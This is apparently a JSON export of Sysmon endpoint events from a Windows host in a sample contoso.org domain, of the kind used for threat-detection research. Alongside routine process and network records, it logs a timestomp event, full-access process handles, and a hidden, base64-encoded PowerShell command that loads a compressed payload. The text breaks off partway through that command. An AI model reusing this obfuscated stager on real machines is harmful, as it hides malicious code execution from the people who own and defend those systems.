        {
            "action": "create",
            "command_line": "C:\\windows\\Explorer.EXE",
            "event_id": "146b6ed65d496226f69012722bd9785ba2db0d2ef322c87df31ba604c1945a23",
            "event_type": "process",
            "event_utc": "2020-09-24T17:37:32.297Z",
            "exe": "explorer.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "0F5E9474588692F6166B4BBA6BD270DF",
                "SHA256": "6F2DFFEB1B1CD1EB02F8F89063A47DA44F76C4ACFB81F80697D13A008C9A6C55"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "146b6ed65d496226f69012722bd9785ba2db0d2ef322c87df31ba604c1945a23",
            "image_path": "C:\\Windows\\explorer.exe",
            "integrity_level": "Medium",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E09A0335-2B00-4D1B-806D-44C74EE92F5D}",
            "logon_id": "0x2e3627",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "EXPLORER.EXE",
            "parent_command_line": "C:\\windows\\system32\\userinit.exe",
            "parent_exe": "userinit.exe",
            "parent_image_path": "C:\\Windows\\System32\\userinit.exe",
            "parent_process_guid": "{DD483508-D95C-5F6C-0000-0010A06F4B00}",
            "pid": 7212,
            "ppid": 7844,
            "process_guid": "{DD483508-D95C-5F6C-0000-0010317A4B00}",
            "record_number": "4095781",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T17:37:32.360Z",
            "timestamp": 1600969052360,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-D95C-5F6C-0000-0010317A4B00}"
        },
        {
            "action": "start",
            "count": 7,
            "dest_fqdn": "srv-dc-98.contoso.org",
            "dest_hostname": "srv-dc-98",
            "dest_ip": "10.0.0.5",
            "dest_ipv6": "false",
            "dest_port": 88,
            "event_id": "32181cbb99404ba7aff2bfa52dff4f89303b84b80cc9801f1e0211af3f9a7a25",
            "event_type": "flow",
            "event_utc": "2020-09-24T17:37:30.911Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "32181cbb99404ba7aff2bfa52dff4f89303b84b80cc9801f1e0211af3f9a7a25",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4095784",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.4",
            "src_ipv6": "false",
            "src_port": 62544,
            "subtype": "start",
            "time": "2020-09-24T17:37:32.586Z",
            "timestamp": 1600969052586,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "9e925a38dcc20d14add681efd0426e0bf5a257db28c798662e55e8aa1633e440",
            "event_type": "flow",
            "event_utc": "2020-09-24T17:39:29.325Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "9e925a38dcc20d14add681efd0426e0bf5a257db28c798662e55e8aa1633e440",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4095991",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 65132,
            "subtype": "start",
            "time": "2020-09-24T17:39:30.462Z",
            "timestamp": 1600969170462,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-98.contoso.org",
            "dest_hostname": "srv-dc-98",
            "dest_ip": "10.0.0.5",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "7dcd7e190cbddc3d279e5e516f417916ab14d192ccc3e8dfeeab97635a12c4a0",
            "event_type": "flow",
            "event_utc": "2020-09-24T17:39:52.114Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7dcd7e190cbddc3d279e5e516f417916ab14d192ccc3e8dfeeab97635a12c4a0",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4096099",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 55668,
            "subtype": "start",
            "time": "2020-09-24T17:39:54.126Z",
            "timestamp": 1600969194126,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
            "event_id": "04939eb3b328f6c9e90a49a10fd65673ae177d3e27f4cae00b0ebe86e11133bd",
            "event_type": "process",
            "event_utc": "2020-09-24T17:39:56.693Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "FF59EF73460173ABDB10EDE1A0BC9CE6",
                "SHA256": "34507738F84B9D4F231DC0C187FEE4A03B4DDB84CF63FF56A4A1761A9BD56EA6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "04939eb3b328f6c9e90a49a10fd65673ae177d3e27f4cae00b0ebe86e11133bd",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "C:\\windows\\Explorer.EXE",
            "parent_exe": "explorer.exe",
            "parent_image_path": "C:\\Windows\\explorer.exe",
            "parent_process_guid": "{DD483508-D95C-5F6C-0000-0010317A4B00}",
            "pid": 4484,
            "ppid": 7212,
            "process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "record_number": "4096111",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T17:39:56.701Z",
            "timestamp": 1600969196701,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}"
        },
        {
            "action": "timestomp",
            "creation_utc_time": "2020-01-27T18:28:31.387Z",
            "event_id": "bccf587111afc1f58f2e2d4dcb5a869be6d9546e268bf7f2bc4eb7a21db5e6f9",
            "event_type": "file",
            "event_utc": "2020-09-24T17:39:57.095Z",
            "file_name": "C:\\Users\\mcasey\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\615JRPOLBEEM3MYJW6RR.temp",
            "file_path": "C:\\Users\\mcasey\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\615JRPOLBEEM3MYJW6RR.temp",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "bccf587111afc1f58f2e2d4dcb5a869be6d9546e268bf7f2bc4eb7a21db5e6f9",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 4484,
            "previous_creation_utc_time": "2020-09-24T17:39:57.095Z",
            "process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "record_number": "4096112",
            "subtype": "timestomp",
            "time": "2020-09-24T17:39:57.105Z",
            "timestamp": 1600969197105,
            "uuid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 17:39:57.986",
            "event_id": "27517d93b34a46412d390159be3c450cee775a00c6f7dc86b65e66ac8ba05b59",
            "event_type": "file",
            "event_utc": "2020-09-24T17:39:57.986Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_e3dd30xu.por.ps1",
            "file_path": "C:\\Users\\mcasey\\AppData\\Local\\Temp\\__PSScriptPolicyTest_e3dd30xu.por.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "27517d93b34a46412d390159be3c450cee775a00c6f7dc86b65e66ac8ba05b59",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 4484,
            "process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "record_number": "4096113",
            "subtype": "create",
            "time": "2020-09-24T17:39:57.987Z",
            "timestamp": 1600969197987,
            "uuid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "a178efba514547d015c7c8da454364011f06b02cfbb21baf5469666aa440c687",
            "event_type": "file",
            "event_utc": "2020-09-24T17:41:59.159Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a178efba514547d015c7c8da454364011f06b02cfbb21baf5469666aa440c687",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4096146",
            "subtype": "create",
            "time": "2020-09-24T17:41:59.161Z",
            "timestamp": 1600969319161,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "\"C:\\windows\\system32\\mmc.exe\" \"C:\\windows\\system32\\services.msc\"",
            "event_id": "b7afc14e6d732ab80a4d6ef3204de5ce028037cc02fa3e77e3c48f3edaa6fdbb",
            "event_type": "process",
            "event_utc": "2020-09-24T17:43:01.033Z",
            "exe": "mmc.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "EB813593728B3EB21084C31EB2C7DE1F",
                "SHA256": "7D63FFA2031B9E764C8876E4A0A4AF9B250FC26D44F4C2D2C36146B50EA4480D"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b7afc14e6d732ab80a4d6ef3204de5ce028037cc02fa3e77e3c48f3edaa6fdbb",
            "image_path": "C:\\Windows\\System32\\mmc.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "mmc.exe",
            "parent_command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "pid": 10084,
            "ppid": 4484,
            "process_guid": "{DD483508-DAA5-5F6C-0000-00109E378000}",
            "record_number": "4096194",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T17:43:01.070Z",
            "timestamp": 1600969381070,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-DAA5-5F6C-0000-00109E378000}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\KERNELBASE.dll+1075a|C:\\windows\\System32\\KERNELBASE.dll+d846|C:\\windows\\System32\\KERNEL32.DLL+1c6e3|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win64.dll+3286e|UNKNOWN(00007FFFAF121000)",
            "event_id": "8ee49bfa44309ddc8b121a3db400c9aec157cee6f81b0212e30354bbcbb556f6",
            "event_type": "process",
            "event_utc": "2020-09-24T17:43:01.066Z",
            "exe": "mmc.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "8ee49bfa44309ddc8b121a3db400c9aec157cee6f81b0212e30354bbcbb556f6",
            "image_path": "C:\\windows\\system32\\mmc.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 10084,
            "process_guid": "{DD483508-DAA5-5F6C-0000-00109E378000}",
            "record_number": "4096195",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "4484",
            "src_process_guid": "{DD483508-D9EC-5F6C-0000-0010F5B56F00}",
            "subtype": "access",
            "time": "2020-09-24T17:43:01.070Z",
            "timestamp": 1600969381070,
            "uuid": "{DD483508-DAA5-5F6C-0000-00109E378000}"
        },
        {
            "action": "start",
            "count": 3,
            "dest_ip": "10.0.0.11",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "26af04d52a6061b35126163b6ebee31f2ca5e8a0fb80161c46682b2fae860324",
            "event_type": "flow",
            "event_utc": "2020-09-24T17:49:58.667Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "26af04d52a6061b35126163b6ebee31f2ca5e8a0fb80161c46682b2fae860324",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4096411",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 63116,
            "subtype": "start",
            "time": "2020-09-24T17:50:00.226Z",
            "timestamp": 1600969800226,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 9,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 49678,
            "event_id": "629902f4e3597e68125b724c8af06c8e946331cf09d1458925fd9dcbdba433b5",
            "event_type": "flow",
            "event_utc": "2020-09-24T18:07:32.306Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "629902f4e3597e68125b724c8af06c8e946331cf09d1458925fd9dcbdba433b5",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4096604",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 63282,
            "subtype": "start",
            "time": "2020-09-24T18:07:33.812Z",
            "timestamp": 1600970853812,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "b96ef19414abf2717023d555abcce17cb4aa868b9ab15ba22770ba24c7c1052c",
            "event_type": "file",
            "event_utc": "2020-09-24T18:09:00.296Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b96ef19414abf2717023d555abcce17cb4aa868b9ab15ba22770ba24c7c1052c",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4096620",
            "subtype": "create",
            "time": "2020-09-24T18:09:00.310Z",
            "timestamp": 1600970940310,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABXAFcALwBpAFMAaABaACsARAByAC8AQwBEADUARQBBAGgAUwBSAG0AQwBZAEUAZQB0AFgAUwA5AGcAcwBGADIAaQBHADMAVwAzAEMAagB5AFUAbwBEAEIAdQA4AHYAWQA1AG4AYgAvADkAMwB0AHMASQBEAGMAOQBuAFoANQBwAGEAUQBiAEoAbwBxAHAAOAAxAHUAOABzAGQAYQB3AGkAZgBLAHYAaQB5AEQAYQB4ADUARgB1AEkAdQBKADIAaABLAEwAWgA5AGoAMgBoAFYASwB0AGUAcwBMADIARABpAEsALwBGAEgAdABiAEoATwBQAEIATQBYAHgAOABYAGkAYgBZAFAAdwBXAHgARAA1ADUAcAB0AHUAVwBSAEcASwBZACsASwB2AHkAdABWAEUAagAzAFMAWABxAEYAMABmADkATwBqAE4AOQBhADMARQBRAFEAMgBpADMAQgBTAEUAeQBFAG8AaQBWAEwAKwA2AHEAbAB5AFYAUgA0AGsAWAA2ADIAdgAwADUAdQBuAFkAUABxAEEAMwBGACsARwB0AGIAOABXAGcAcQBQAFoAQwBCAFEASAByAHUANwByAHQAdgBYADcANQB3AGkAUgBSAGgARAB4ADgAMgB0ADgATgBFAEsAYgBpAEcATABtAEcAWQA2AE8ANABWAGkAZQArAEUAZgBNAHQAaQB0AEQAdABrADcARgBEAEoAaQBiACsASQBxADcAZgA3AGcAYQBPAGIAKwBqAE8AbQBTAHgAbgBkAEgATQBMAEQAbABHAGUAVgBiAHcAVABmAFYATQB2AFAATABoAFQAQQA4AGYARwB0AGUAcQBmAGYAMQBiAHIATAA3AGYATgAxAHoAcwB1AFQASABRAG4AcgBsAFgAVgBQAE0AYgBJAHYAYgBNAGMAcAAxAG8AbgB2AHQAYwBMAGgAVgBvAGUAbwBGAHAAVgBzAHMAMwBJAGoALwAwADEAdgBwAHYAYgBYAHIAdAAxAE4AeQAyAHQAbAAwAHYAagBwAFoAUAB0ADEAZgByAFoAcwAwADIAZwBnAHgAKwAvAGQAcgBLAFEAZQB1AEsAcABWAFcARQA1AEEAVwB5AG8ARQA0AGIAVgBCAHYARgBTADYASAB0ADUAZgBTAFgAKwBlAEwAZABHAFMAVAB4AHMAdQArAGgATwA4AEQAQwBLAC8ARQBCAEYAMABjAEUAMgBVAFgAdwAzADEARAAzAEwAUQBRAHAAYQBBADEAcwAxAGgAdgBCADUAbQAyAG8AZABqAEkAZwBRAFQAaQBLAFAAdQBOAGcAQwBmAEEAZAAvAGoAMgByAFgAWAB1AEkANABEAFoARAA3ADgAcgB0AHkAWAAyAHMAeQBTAGkALwBnAC8AaQA1AFQANwBTAE0AVABVAEUAMQB3AFYARwArAGMAYwArAEoAMwA0AEoARABLAHYARABtAEoAQQAzAGQAKwBzAHYANQBEAGMAdABYAGgAOQAxAE8AQwAxAFMAdgBmAEsANQArAGsAcQBvAFUAYwB0AE4ARQB4AGUAcwBPAEEANwA0AGQAYwByAFYAeABkAHYAWgBSAEwAQgBQADcAVQBKAG4ANQBzAGwAMwB4AGYAQwBiAEoAQgBTAEcAQwBFAGoAdgAwAG8ATAA4AEsAcABSAFEAbQBxAHYALwA0AFQAbgA1AFAAYQBDADIAZgBjACsASwBXAGcANQBvAFgAcgB6AEgATQBLAHoAOABtAE8AcgA4AFQATAB6AEwAZQB0ADEAOABwAFYAdgBYAEwATwBuAHUATAA4AHoAVQBoAHMAeAAwAEoAUgA4AGYANwBYADEAYwBDAGkAdABlADAAaABOAHYAZAAwADEAegBZAHYAQwBWAC8ANwBMAEcAWgBvADcAYQBBAFMAagA3AHMATABtAFEAeAAyADEAcQByAG4ARgA4AGgAaQB6ACsAaABVAEMAMABCAGYAZgBtAGIAagBYAEIAdQAvADgAOQBJAG4ANAB5AGcAVAA0AGgANgBEAFYAWgBBAFMAOQBSACsATgBPAGMAVwB3AFYAaABVADgAQwBiAG0AQQAzADIAawBQAGEAWABxADkAaABqAEoARABGACsAcAB6AGEAZQBVAFgANwBjAFcAKwB5AEcAWABHADAAZQBPADQAUQBVAHcAUwBxAEgATwB6AFEAYQBoAEkAZAA1AEQAVgBJAEMAZwB2AHQAcwArAHYAcQBBAFQANwA1AGIATAA2AGoANwBsAFMANABtAEQAYgAxAEcATgA4AEUAZgBkAGEALwB3AFQAUwBzADIAcgBHADkANgBCAGkARQBoAE8AaQBDAHoAQgBvAGEAbwBCAE0AVwAzAGMASwBWAEIAcgBFADAATABZAFEAbgBhAHYAMgA1AG0ASgBDADkAVgBOAE0ARwBOADEAeABvAE8AUgBBADAAZwBGAGkAQQBpAGMARgBGAGkAbwB1AGMAaQBhAHkARwB2ACsAZQBIAC8AVQA3AEYAVwBIAEIARABSAHoAawBBAG4AWABaAGgAWABoAEgAMwAwAEQAUABPAFYAZABVAG0AVwA3ADYAQgBsAG4AVgAvADIARAAyAHAAVQA1AE8AUgBWAEYAZwBkAFEASABwAGcAOQBHAFEAQQBLAHIAagA0AHcAWQB4AHMAeQBNAE0AZgBhADMAYQArAEMAbgB4AC8AagBmAHoAZgBtAHcAeABQADUAagBKAFIATwBnAGMAeQBGAHAAWgBpAEMAOQAwAGoAbwB0AHkASwBTAG4ATgA0AG4ATAA1ACsAbwA1AGwAaQBWAHkARQBBAFQAVQArADgAbAAxAGEAagAxAEcAMwBvADUAWgB0AHIARgBaAHQAOQA1AEoAUQB5AEsAWABkAGMAegBjAGEAYwBBAGQAKwBHAEEANAA1AEQAWgA0AEQAUABPADIAUQA1ADAAUgB4AHAAQQBTADAASQBwAHAAYwA4AGoAUQBaAGsAcQBPADEAOABOAHgAagBPADAAbQBhAEMASQBsAEcAawAyADIAZQBCAEwAcABqAE8ATwBEAFcAdwB1AEgASgBYAHoAWQBUAHQAOQBPADAAQQB1AEUAZwB3ADEAbgA4AEcAQQA1AGoAVgBqAGkAdwAxAEwAQQBWACsAbgB4ADMAWQAvAGYAUABjAGsANwA4AHoAMABiAGEATgBCAFkAQwAvADIAZwBNACsATQA1AHcARgB2AE0ARgAvAFYAQQA0ADAASAB6AEkAOQBIADEAWQAzAHcAcwBIAHgAaAA4AEIAWAA2ADgAYgBlAEgAUgBxAGQAUgBBADMANgBxAEsARgBhAEsAWgB0ADMARQBQADYASgBzAHYASABzAHgAdQBWAGIAQQA1AG0AdQBTAHoATwB1AEUAQgBXAFAAVQBzADAAbQBzAC8AOABTAEQANgAyAGMAdgBBAEoALwBGAEwAYgBRADQAVwAwADQARgBFAHoAcAB6AG4AMwBOAGIATQBmAGgAOABQAEMAWAAwAFMATABvAGUAbQBOAFIAcwBKAHcAbABLAHMAUABHADEAdgBJADUAZABRAGsATQBSAGwARwBSADYAYwA5AFcAUgAzAHoAcwBBAGYAOABjAGcAYwB3AHkAZABSAGMAVQBqAHAAZABLAHoATQBYAGYARwBvAHUAWgBEAEUAZgBMAHUAVQBCADYAQQBpAFQAKwBhAFkAegBsAEUAVQAvAG8AMwBaAEMATgAyAEoAVgAxAFQAcQBxAFcAdABaAFUAbQB5AHYAbgBvAEMALwBNAHYAcABlAFcAKwBsAFUAcgBTADYAMQBwAC8ARABUAFMAOABMAEkAOQAwAGQAMQBPAG4AbgB0AGQAVgBkAGcASgBtAFcAZwBHAGUATABZAFkAZABTAE0AOQBaAHcATABSAFIAZwBhADkAeABvAFgAYwBrAGIAagBhAGoAUABvAGMAcgBEAG0AYwBrAGEAcQBxADUAQgBiAG8AZABZAFkAYQBPAHcAYQA5AEgAaQBOAEoANABJAFAAKwB3AEMALwAzAHEARAAwAFoAegArAFcAagAyAGEAWgBGAE0ANAA4AEUAOABHAE0AeQA3AHQAbwBnAHUANABlAGwATgBwAHkAegB2AEsASwB4AFgARQBCAHAAVgBKAE4AVAA5ADEATgBUAEkAegBOAHEAdQBGAC8ASgBBAHQAbgBaADMAawB3AGsAeQBwADUAdABsAHcATwBCAFAAUABZAEcARQBUAFcAUAA1ADMAbgBZAG0AZABKAFIAdABoAGQAMABiAGEAZAAwADAAZABiAEkAKwBXAFkANwA4ADgAZQBrAGMAVQBEADMAeQBlAHgAKwBmADYALwB1AFUAcABUAEcATwAzAE0AMABaAFgAbQBTAEQAWQArAGkAUgBuAGYAUwBJAE8AMgBvAGMAbQB2AEsAcgBSAFQAVwBIAFgASABLAHYAcgBrAFkAUABNAHUASgB4AGoAdABqAGoAZQB3AHoATABHADMASwBYAEMAcQBKAFMAeQA1ADcAbQBwAEsAagBoAGIAcgBuAEoAOABwADIAdwB4AG8AZQBIAGEANAAyADAAbwB4AFYAcABDAFgAVgBWAHMAYgBhADEASgBKAG0AUABNAFUAYQBDAHoAQgA3AFEANgBvAEQAUwBuADYAZQBLAGMASwBTAFMAcAB0ADQANQBaAG4AcwBjAHQARABQAHEASQB3AEQAVwBlAFMAYwB5ADUANABWAG4AdAA2AHcANwBMAHoAcABRAG0AUgBrAHIAawBXAE4AUgBYAHUALwBlADEAeABNAGIAOQB5AHUATQAzAFoANgBDAEYAUwA1AHIAdQBoAHMAZwArADIAVwBXAGcAYQB6ACsAKwBYAEUAVgBmAE4ASABSAG8AdABiAGEAMwBWAEkAdAA2AHgANABlAHUALwBTAEcAVABOAHYAcgBpAEkAegBiAFMAcABHAGoANQBuAGUAegBLAFoAdQBvAEUAMgA1AEEAYgB2AGEARAAvAGIAcQB5AGgATgBNAGoAegBhAGIAegBFAFQAcgB4AHIAdgArAEsAaABTADIAYQB6AC8AcQB5AHoATgBIAGYATgB3ADMAZwA5ADcARAB2AG0AMwBFAEwASABPAGoAVABIAE0AQgA2AGIAMQBnAHYARwBiAHYAQgBWADcAVgAwAG8AZgBSAEkAdQB6AE8ARAA2AHoATQBpAGYARQBtAFUAcwBuAFYAOAA3AHEAbgAyACsATgBRAHMAMgA3ADYANAB3ADUAZQBiADcAcABiAHoAKwBmAEoAMwBVAFEASwB4AFAAVgBEAHgAbABCAFMAMQB2AE8AVQBpAGMAcgBsAEYAQgBYAE0AbAB5AFoASwBBAG0AbgBMAEcANgAxADAAbQBvAHAASwAwAGsAOQB0AGUAYQB0AFkANAB5AEYARABQAFkAZgBMAHMAZABtAGQAWgBrAHcAdwA1AGwAbQBhAHYAMQArAGIAZABMAHMANQBkAHUAKwBGAGQAcABlAGoAYwArAEYAeAAvAGkAVAAxAFIAMwA3ADQAWgBPAC8AbQBxADcANgBXAEwASABkAHEALwAyAG0AKwBXAFUAQQB1ADcAcAAwAGQANQBQAEUAUgBjAGwAcQBFAFoAeQBlADAARgBSAEYAMQByAEQAUwBEAEgASQB0AEgAdgBsAFAAVQBoAEgAQQBJAGMAbgBNAGMAYwBSAFkAWAA3AHkAagBZAG0AOABPAFoASwBCAG4AegBNAEwAVwBPAHIAUwBDAFIARgB3AC8ANgBaAGkAOABrAEQATgBTADQATQBVAEEAMwByAEIAagBpAFIAOABnADcAUQBXAE8AVgBXAE8AYQAyAGwATQBvAHEAZwBqAEsAdwBwAGQAQgBsAEYAbgByAFIAdgBRAEEAcgBtAEUAZQB5ADQAbwA3AC8ARgB3AEgALwB0AHcANABtADMAdgBzAFQAZABDAFYAbwBlAE0AWAA1AHoAVQAyADkAbQBCAFAAZQAzADcAeABjAFoANgArAFgAdQBlADUAOQBmADIAdABrAEkASwAzADkAVQBQAFMANgA4AHMAMQBCAC8AOQBEAGgAZgBqAFUAcwBTAFgAbwBVAGIAMwBVAEgATwBoADgATQBQAEoAZgByAGkAdgBjAGoALwBqAHkAMgBUAEgAeQA3ADQASwBqAFYAUABwACsAMAA5AHkAagB5AGsAQQBOAFQASwBNAHkAcABsAHkAWgBQAE8AWQA1AHYARgBvAFAAVwBMAHkAWQBlAEcAUAB0AE8AdwA5AGcAcgBYAEcAWgBUAFcATABaAGIAbgA2ADcAcQB4AEQAcwBoAFQARgBjAG4AbgA0AHgAawB2AFMANgBIAGsAYgBPAEgAbAA1AG4AcwBRAHYAagBsAHkAdwByAGMAYQAzAHcAQQBVAFUAVABlAEIAbQA4AGIAQgBKAG0AMQBTAFoASQBzAC8AagB0AGsAdgBmAEwANwBzAEQAQgArAGsATgBmA